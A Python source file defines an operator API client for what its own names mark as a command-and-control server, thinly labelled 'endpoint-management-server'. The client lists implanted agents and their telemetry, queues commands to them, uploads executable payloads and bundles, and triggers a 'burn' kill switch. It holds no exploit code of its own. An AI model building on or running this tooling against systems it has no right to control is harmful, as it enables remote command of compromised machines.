"""C2ApiClient — wraps the Go endpoint-management-server operator API."""

from __future__ import annotations

import requests


class C2ApiClient:
    def __init__(self, addr: str, jwt: str) -> None:
        self.base = addr.rstrip("/")
        self.jwt  = jwt

    @staticmethod
    def login(addr: str, username: str, password: str) -> "C2ApiClient":
        base = addr.rstrip("/")
        resp = requests.post(
            f"{base}/api/v1/operator/login",
            json={"username": username, "password": password},
            timeout=10,
        )
        resp.raise_for_status()
        token = resp.json().get("token")
        if not token:
            raise ValueError("login response missing 'token' field")
        return C2ApiClient(base, token)

    def _h(self) -> dict:
        return {"Authorization": f"Bearer {self.jwt}"}

    # ── Agent management ──────────────────────────────────────────────

    def list_agents(self, limit: int = 100) -> list[dict]:
        resp = requests.get(
            f"{self.base}/api/v1/operator/agents",
            headers=self._h(),
            params={"limit": limit},
            timeout=10,
        )
        resp.raise_for_status()
        return resp.json().get("agents", [])

    def list_tasks(self, agent_id: str, limit: int = 50) -> list[dict]:
        resp = requests.get(
            f"{self.base}/api/v1/operator/tasks",
            headers=self._h(),
            params={"agent_id": agent_id, "limit": limit},
            timeout=10,
        )
        resp.raise_for_status()
        return resp.json().get("tasks", [])

    def list_telemetry(self, agent_id: str, limit: int = 50) -> list[dict]:
        resp = requests.get(
            f"{self.base}/api/v1/operator/telemetry",
            headers=self._h(),
            params={"agent_id": agent_id, "limit": limit},
            timeout=10,
        )
        resp.raise_for_status()
        return resp.json().get("telemetry", [])

    def create_task(
        self,
        agent_id: str,
        command_type: str,
        payload: dict | None = None,
    ) -> dict:
        resp = requests.post(
            f"{self.base}/api/v1/agent/{agent_id}/tasks",
            headers=self._h(),
            json={"command_type": command_type, "payload": payload or {}},
            timeout=10,
        )
        resp.raise_for_status()
        return resp.json()

    # ── Payload / bundle management ───────────────────────────────────

    def upload_payload(self, payload_bytes: bytes, filename: str = "payload.exe") -> dict:
        resp = requests.post(
            f"{self.base}/api/v1/operator/payload/upload",
            headers=self._h(),
            files={"file": (filename, payload_bytes, "application/octet-stream")},
            timeout=60,
        )
        resp.raise_for_status()
        return resp.json()

    def payload_status(self) -> dict:
        resp = requests.get(
            f"{self.base}/api/v1/operator/payload/status",
            headers=self._h(),
            timeout=10,
        )
        resp.raise_for_status()
        return resp.json()

    def upload_bundle(self, bundle_bytes: bytes) -> dict:
        resp = requests.post(
            f"{self.base}/api/v1/operator/bundle/upload",
            headers=self._h(),
            files={"bundle": ("bundle.bin", bundle_bytes, "application/octet-stream")},
            timeout=60,
        )
        resp.raise_for_status()
        return resp.json()

    # ── Kill switch ───────────────────────────────────────────────────

    def burn(self) -> dict:
        resp = requests.post(
            f"{self.base}/api/v1/operator/burn",
            headers=self._h(),
            timeout=30,
        )
        resp.raise_for_status()
        return resp.json()
